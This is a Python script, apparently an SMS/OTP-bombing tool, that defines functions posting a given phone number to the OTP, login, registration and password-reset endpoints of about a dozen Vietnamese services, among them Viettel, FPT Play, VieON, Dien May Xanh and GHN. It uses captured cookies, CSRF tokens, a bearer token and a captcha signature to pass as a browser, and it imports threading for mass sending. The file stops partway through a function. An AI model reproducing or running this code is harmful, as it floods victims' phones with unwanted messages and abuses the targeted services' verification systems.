import requests
import time
import json
import sys
import random
import string
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import threading
import requests
import concurrent.futures
import time

last_names = ['Nguyễn', 'Trần', 'Lê', 'Phạm', 'Vũ', 'Hoàng']
middle_names = ['Văn', 'Thị', 'Quang', 'Hoàng', 'Anh', 'Thanh']
first_names = ['Nam', 'Tuấn', 'Hương', 'Linh', 'Long', 'Duy']

# Tạo tên ngẫu nhiên
def generate_random_name():
    last_name = random.choice(last_names)
    middle_name = random.choice(middle_names) if random.choice([True, False]) else ''  # Optional middle name
    first_name = random.choice(first_names)
    return f"{last_name} {middle_name} {first_name}".strip()


def generate_random_id():
    def random_segment(length):
        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
    
    return f"{random_segment(2)}7D7{random_segment(1)}6{random_segment(1)}E-D52E-46EA-8861-ED{random_segment(1)}BB{random_segment(2)}86{random_segment(3)}"

def generate_random_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=32))

def format_device_id(device_id):
    return f"{device_id[:8]}-{device_id[8:12]}-{device_id[12:16]}-{device_id[16:20]}-{device_id[20:]}"

random_id = generate_random_id()
formatted_device_id = format_device_id(random_id)


#//////////////////////////

def send_otp_via_sapo(sdt):
    cookies = {
        'landing_page': 'https://www.sapo.vn/',
        'start_time': '07/30/2024 16:21:32',
        'lang': 'vi',
        'G_ENABLED_IDPS': 'google',
        'source': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
        'referral': 'https://accounts.sapo.vn/',
        'pageview': '7',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'dnt': '1',
        'origin': 'https://www.sapo.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    data = {
        'phonenumber': sdt,
    }

    response = requests.post('https://www.sapo.vn/fnb/sendotp', cookies=cookies, headers=headers, data=data)
    
		
def send_otp_via_viettel(sdt):
    cookies = {
        'laravel_session': 'ubn0cujNbmoBY3ojVB6jK1OrX0oxZIvvkqXuFnEf',
        'redirectLogin': 'https://viettel.vn/myviettel',
        'XSRF-TOKEN': 'eyJpdiI6ImxkRklPY1FUVUJvZlZQQ01oZ1MzR2c9PSIsInZhbHVlIjoiWUhoVXVBWUhkYmJBY0JieVZEOXRPNHorQ2NZZURKdnJiVDRmQVF2SE9nSEQ0a0ZuVGUwWEVDNXp0K0tiMWRlQyIsIm1hYyI6ImQ1NzFjNzU3ZGM3ZDNiNGMwY2NmODE3NGFkN2QxYzI0YTRhMTIxODAzZmM3YzYwMDllYzNjMTc1M2Q1MGMwM2EifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        'DNT': '1',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/myviettel',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-CSRF-TOKEN': 'H32gw4ZAkTzoN8PdQkH3yJnn2wvupVCPCGx4OC4K',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6ImxkRklPY1FUVUJvZlZQQ01oZ1MzR2c9PSIsInZhbHVlIjoiWUhoVXVBWUhkYmJBY0JieVZEOXRPNHorQ2NZZURKdnJiVDRmQVF2SE9nSEQ0a0ZuVGUwWEVDNXp0K0tiMWRlQyIsIm1hYyI6ImQ1NzFjNzU3ZGM3ZDNiNGMwY2NmODE3NGFkN2QxYzI0YTRhMTIxODAzZmM3YzYwMDllYzNjMTc1M2Q1MGMwM2EifQ==',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': sdt,
        'typeCode': 'DI_DONG',
        'actionCode': 'myviettel://login_mobile',
        'type': 'otp_login',
    }

    response = requests.post('https://viettel.vn/api/getOTPLoginCommon', cookies=cookies, headers=headers, json=json_data)
    


def send_otp_via_medicare(sdt):
    cookies = {
        'SERVER': 'nginx2',
        '_gcl_au': '1.1.481698065.1722327865',
        '_tt_enable_cookie': '1',
        '_ttp': 'sCpx7m_MUB9D7tZklNI1kEjX_05',
        '_gid': 'GA1.2.1931976026.1722327868',
        '_ga_CEMYNHNKQ2': 'GS1.1.1722327866.1.1.1722327876.0.0.0',
        '_ga_8DLTVS911W': 'GS1.1.1722327866.1.1.1722327876.0.0.0',
        '_ga_R7XKMTVGEW': 'GS1.1.1722327866.1.1.1722327876.50.0.0',
        '_ga': 'GA1.2.535777579.1722327867',
        'XSRF-TOKEN': 'eyJpdiI6ImFZV0RqYTlINlhlL0FrUEdIaEdsSVE9PSIsInZhbHVlIjoiZkEvVFhpb0VYbC85RTJtNklaWXJONE1oSEFzM2JMdjdvRlBseENjN3VKRzlmelRaVFFHc2JDTE42UkxCRnhTd3Z5RHJmYVZvblVBZCs1dDRvSk5lemVtRUlYM1Uzd1RqV0YydEpVaWJjb2oyWlpvekhDRHBVREZQUVF0cTdhenkiLCJtYWMiOiIyZjUwNDcyMmQzODEwNjUzOTg3YmJhY2ZhZTY2YmM2ODJhNzUwOTE0YzdlOWU5MmYzNWViM2Y0MzNlODM5Y2MzIiwidGFnIjoiIn0%3D',
        'medicare_session': 'eyJpdiI6InRFQ2djczdiTDRwTHhxak8wcTZnZVE9PSIsInZhbHVlIjoiZW8vM0ZRVytldlR1Y0M1SFZYYlVvN3NrN0x6UmFXQysyZW5FbTI2WnBCUXV1RE5qbCtPQ1I0YUJnSzR4M1FUYkRWaDUvZVZVRkZ4eEU4TWlGL2JNa3NmKzE1bFRiaHkzUlB0TXN0UkN6SW5ZSjF2dG9sODZJUkZyL3FnRkk1NE8iLCJtYWMiOiJmZGIyNTNkMjcyNGUxNGY0ZjQwZjBiY2JjYmZhMGE1Y2Q1NTBlYjI3OWM2MTQ0YTViNDU0NjA5YThmNDQyMzYwIiwidGFnIjoiIn0%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        # 'Cookie': 'SERVER=nginx2; _gcl_au=1.1.481698065.1722327865; _tt_enable_cookie=1; _ttp=sCpx7m_MUB9D7tZklNI1kEjX_05; _gid=GA1.2.1931976026.1722327868; _ga_CEMYNHNKQ2=GS1.1.1722327866.1.1.1722327876.0.0.0; _ga_8DLTVS911W=GS1.1.1722327866.1.1.1722327876.0.0.0; _ga_R7XKMTVGEW=GS1.1.1722327866.1.1.1722327876.50.0.0; _ga=GA1.2.535777579.1722327867; XSRF-TOKEN=eyJpdiI6ImFZV0RqYTlINlhlL0FrUEdIaEdsSVE9PSIsInZhbHVlIjoiZkEvVFhpb0VYbC85RTJtNklaWXJONE1oSEFzM2JMdjdvRlBseENjN3VKRzlmelRaVFFHc2JDTE42UkxCRnhTd3Z5RHJmYVZvblVBZCs1dDRvSk5lemVtRUlYM1Uzd1RqV0YydEpVaWJjb2oyWlpvekhDRHBVREZQUVF0cTdhenkiLCJtYWMiOiIyZjUwNDcyMmQzODEwNjUzOTg3YmJhY2ZhZTY2YmM2ODJhNzUwOTE0YzdlOWU5MmYzNWViM2Y0MzNlODM5Y2MzIiwidGFnIjoiIn0%3D; medicare_session=eyJpdiI6InRFQ2djczdiTDRwTHhxak8wcTZnZVE9PSIsInZhbHVlIjoiZW8vM0ZRVytldlR1Y0M1SFZYYlVvN3NrN0x6UmFXQysyZW5FbTI2WnBCUXV1RE5qbCtPQ1I0YUJnSzR4M1FUYkRWaDUvZVZVRkZ4eEU4TWlGL2JNa3NmKzE1bFRiaHkzUlB0TXN0UkN6SW5ZSjF2dG9sODZJUkZyL3FnRkk1NE8iLCJtYWMiOiJmZGIyNTNkMjcyNGUxNGY0ZjQwZjBiY2JjYmZhMGE1Y2Q1NTBlYjI3OWM2MTQ0YTViNDU0NjA5YThmNDQyMzYwIiwidGFnIjoiIn0%3D',
        'Origin': 'https://medicare.vn',
        'Referer': 'https://medicare.vn/login',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'X-XSRF-TOKEN': 'eyJpdiI6ImFZV0RqYTlINlhlL0FrUEdIaEdsSVE9PSIsInZhbHVlIjoiZkEvVFhpb0VYbC85RTJtNklaWXJONE1oSEFzM2JMdjdvRlBseENjN3VKRzlmelRaVFFHc2JDTE42UkxCRnhTd3Z5RHJmYVZvblVBZCs1dDRvSk5lemVtRUlYM1Uzd1RqV0YydEpVaWJjb2oyWlpvekhDRHBVREZQUVF0cTdhenkiLCJtYWMiOiIyZjUwNDcyMmQzODEwNjUzOTg3YmJhY2ZhZTY2YmM2ODJhNzUwOTE0YzdlOWU5MmYzNWViM2Y0MzNlODM5Y2MzIiwidGFnIjoiIn0=',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'mobile': sdt,
        'mobile_country_prefix': '84',
    }

    response = requests.post('https://medicare.vn/api/otp', cookies=cookies, headers=headers, json=json_data)
    


def send_otp_via_tv360(sdt):

    cookies = {
        'img-ext': 'avif',
        'NEXT_LOCALE': 'vi',
        'session-id': 's%3A472d7db8-6197-442e-8276-7950defb8252.rw16I89Sh%2FgHAsZGV08bm5ufyEzc72C%2BrohCwXTEiZM',
        'device-id': 's%3Aweb_89c04dba-075e-49fe-b218-e33aef99dd12.i%2B3tWDWg0gEx%2F9ZDkZOcqpgNoqXOVGgL%2FsNf%2FZlMPPg',
        'shared-device-id': 'web_89c04dba-075e-49fe-b218-e33aef99dd12',
        'screen-size': 's%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q',
        'G_ENABLED_IDPS': 'google',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        # 'cookie': 'img-ext=avif; NEXT_LOCALE=vi; session-id=s%3A472d7db8-6197-442e-8276-7950defb8252.rw16I89Sh%2FgHAsZGV08bm5ufyEzc72C%2BrohCwXTEiZM; device-id=s%3Aweb_89c04dba-075e-49fe-b218-e33aef99dd12.i%2B3tWDWg0gEx%2F9ZDkZOcqpgNoqXOVGgL%2FsNf%2FZlMPPg; shared-device-id=web_89c04dba-075e-49fe-b218-e33aef99dd12; screen-size=s%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q; G_ENABLED_IDPS=google',
        'dnt': '1',
        'origin': 'https://tv360.vn',
        'priority': 'u=1, i',
        'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'starttime': '1722324791163',
        'tz': 'Asia/Bangkok',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'msisdn': sdt,
    }

    response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, json=json_data)
    
		
def send_otp_via_dienmayxanh(sdt):
    cookies = {
        'TBMCookie_3209819802479625248': '657789001722328509llbPvmLFf7JtKIGdRJGS7vFlx2E=',
        '___utmvm': '###########',
        '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
        'SvID': 'new2690|Zqilx|Zqilw',
        'mwgngxpv': '3',
        '.AspNetCore.Antiforgery.SuBGfRYNAsQ': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5TQ7UQGmBzPEH6s6-tzBBTiKEgcfjZWXpY8_IL-DTacK3it55OPdddwuXNc2mgQzfoEMl9eFbSuvHz3ySnzPW-Ww4YccqMERZSMCsSY8f1eBwOpd9HzD1YsnrhTwgAuLxM',
        'DMX_Personal': '%7B%22UID%22%3A%225cb3bf4ae0e8e527f2e3813bf976bee79ea330dc%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': "TBMCookie_3209819802479625248=657789001722328509llbPvmLFf7JtKIGdRJGS7vFlx2E=; ___utmvm=###########; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; SvID=new2690|Zqilx|Zqilw; mwgngxpv=3; .AspNetCore.Antiforgery.SuBGfRYNAsQ=CfDJ8LmkDaXB2QlCm0k7EtaCd5TQ7UQGmBzPEH6s6-tzBBTiKEgcfjZWXpY8_IL-DTacK3it55OPdddwuXNc2mgQzfoEMl9eFbSuvHz3ySnzPW-Ww4YccqMERZSMCsSY8f1eBwOpd9HzD1YsnrhTwgAuLxM; DMX_Personal=%7B%22UID%22%3A%225cb3bf4ae0e8e527f2e3813bf976bee79ea330dc%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D",
        'DNT': '1',
        'Origin': 'https://www.dienmayxanh.com',
        'Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phoneNumber': sdt,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5Ri89ZiNhfmFcY9XtYAjjDirvSdcYRdWZG8hw_ch4w5eMUQc0d_fRDOu0QzDWE_fHeK8txJRRqbPmgZ61U70owDeZCkCDABV3jc45D8wyJ5wfbHpS-0YjALBHW3TKFiAxU',
    }

    response = requests.post(
        'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
        cookies=cookies,
        headers=headers,
        data=data,
    )

    


def send_otp_via_kingfoodmart(sdt):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
        'authorization': '',
        'content-type': 'application/json',
        'domain': 'kingfoodmart',
        'origin': 'https://kingfoodmart.com',
        'priority': 'u=1, i',
        'referer': 'https://kingfoodmart.com/',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    }

    json_data = {
        'operationName': 'SendOtp',
        'variables': {
            'input': {
                'phone': sdt,
                'captchaSignature': 'HFMWt2IhJSLQ4zZ39DH0FSHgMLOxYwQwwZegMOc2R2RQwIQypiSQULVRtGIjBfOCdVY2k1VRh0VRgJFidaNSkFWlMJSF1kO2FNHkJkZk40DVBVJ2VuHmIiQy4AL15HVRhxWRcIGXcoCVYqWGQ2NWoPUxoAcGoNOQESVj1PIhUiUEosSlwHPEZ1BXlYOXVIOXQbEWJRGWkjWAkCUysD',
            },
        },
        'query': 'mutation SendOtp($input: SendOtpInput!) {\n  sendOtp(input: $input) {\n    otpTrackingId\n    __typename\n  }\n}',
    }

    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)

		
def send_otp_via_mocha(sdt):
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
        # 'Content-Length': '0',
    'Origin': 'https://video.mocha.com.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://video.mocha.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

    params = {
    'msisdn': sdt,
    'languageCode': 'vi',
    }

    response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)


    
def send_otp_via_fptdk(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json; charset=UTF-8',
        'dnt': '1',
        'origin': 'https://fptplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://fptplay.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-did': 'A0EB7FD5EA287DBF',
    }

    json_data = {
        'phone': sdt,
        'country_code': 'VN',
        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
    }

    response = requests.post(
        'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=HvBYCEmniTEnRLxYzaiHyg&e=1722340953&device=Microsoft%20Edge(version%253A127.0.0.0)&drm=1',
        headers=headers,
        json=json_data,
    )
    
def send_otp_via_fptmk(sdt): # là quên pass ở fps á
    cookies = {
        'auth.strategy': '',
        'expire_welcome': '14400',
        'fpt_uuid': '%226b6e6e3c-9275-43ef-8c91-0d2aea2753e1%22',
        'ajs_group_id': 'null',
        'G_ENABLED_IDPS': 'google',
        'CDP_ANONYMOUS_ID': '1722362340735',
        'CDP_USER_ID': '1722362340735',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        # 'cookie': 'auth.strategy=; expire_welcome=14400; fpt_uuid=%226b6e6e3c-9275-43ef-8c91-0d2aea2753e1%22; ajs_group_id=null; G_ENABLED_IDPS=google; CDP_ANONYMOUS_ID=1722362340735; CDP_USER_ID=1722362340735',
        'dnt': '1',
        'referer': 'https://fptplay.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'script',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    response = requests.get(
        'https://fptplay.vn/_nuxt/pages/block/_type/_id.26.0382316fc06b3038d49e.js',
        cookies=cookies,
        headers=headers,
    )


    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json; charset=UTF-8',
        'dnt': '1',
        'origin': 'https://fptplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://fptplay.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-did': 'A0EB7FD5EA287DBF',
    }

    json_data = {
        'phone': sdt,
        'country_code': 'VN',
        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
    }

    response = requests.post(
        'https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp?st=0X65mEX0NBfn2pAmdMIC1g&e=1722365955&device=Microsoft%20Edge(version%253A127.0.0.0)&drm=1',
        headers=headers,
        json=json_data,
    )
    
def send_otp_via_VIEON(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjI1MTA3NDksImp0aSI6IjQ3OGJkODI1MmY2ODdkOTExNzdlNmJhM2MzNTE5ZDNkIiwiYXVkIjoiIiwiaWF0IjoxNzIyMzM3OTQ5LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTcyMjMzNzk0OCwic3ViIjoiYW5vbnltb3VzX2Y4MTJhNTVkMWQ1ZWUyYjg3YTkyNzgzM2RmMjYwOGJjLTRmNzQyY2QxOTE4NjcwYzIzODNjZmQ3ZGRiNjJmNTQ2LTE3MjIzMzc5NDkiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiZjgxMmE1NWQxZDVlZTJiODdhOTI3ODMzZGYyNjA4YmMtNGY3NDJjZDE5MTg2NzBjMjM4M2NmZDdkZGI2MmY1NDYtMTcyMjMzNzk0OSIsInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNy4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMjcuMC4wLjAiLCJkdCI6IndlYiIsIm10aCI6ImFub255bW91c19sb2dpbiIsIm1kIjoiV2luZG93cyAxMCIsImlzcHJlIjowLCJ2ZXJzaW9uIjoiIn0.RwOGV_SA9U6aMo84a1bxwRjLbxdDLB-Szg7w_riYKAA',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://vieon.vn',
        'priority': 'u=1, i',
        'referer': 'https://vieon.vn/auth/?destination=/&page=/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    params = {
        'platform': 'web',
        'ui': '012021',
    }

    json_data = {
        'username': sdt,
        'country_code': 'VN',
        'model': 'Windows 10',
        'device_id': 'f812a55d1d5ee2b87a927833df2608bc',
        'device_name': 'Edge/127',
        'device_type': 'desktop',
        'platform': 'web',
        'ui': '012021',
    }

    response = requests.post('https://api.vieon.vn/backend/user/v2/register', params=params, headers=headers, json=json_data)
    
def send_otp_via_ghn(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://sso.ghn.vn',
        'priority': 'u=1, i',
        'referer': 'https://sso.ghn.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'phone': sdt,
        'type': 'register',
    }

    response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)
    
def send_otp_via_lottemart(sdt):

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
